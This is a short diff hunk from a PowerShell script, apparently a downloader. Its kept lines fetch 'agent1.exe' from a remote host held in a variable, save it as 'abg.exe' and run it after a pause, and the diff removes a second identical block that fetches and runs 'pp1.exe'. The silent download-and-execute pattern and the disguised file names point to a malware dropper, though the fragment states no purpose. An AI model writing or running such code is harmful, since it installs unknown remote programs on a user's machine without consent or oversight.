@@ -21,8 +21,3 @@ $f3 = "$d\abg.exe"
 (New-Object Net.WebClient).DownloadFile("$s/agent1.exe", $f3)
 Start-Sleep -Seconds 3
 Start-Process $f3
-
-$f4 = "$d\p5.exe"
-(New-Object Net.WebClient).DownloadFile("$s/pp1.exe", $f4)
-Start-Sleep -Seconds 3
-Start-Process $f4
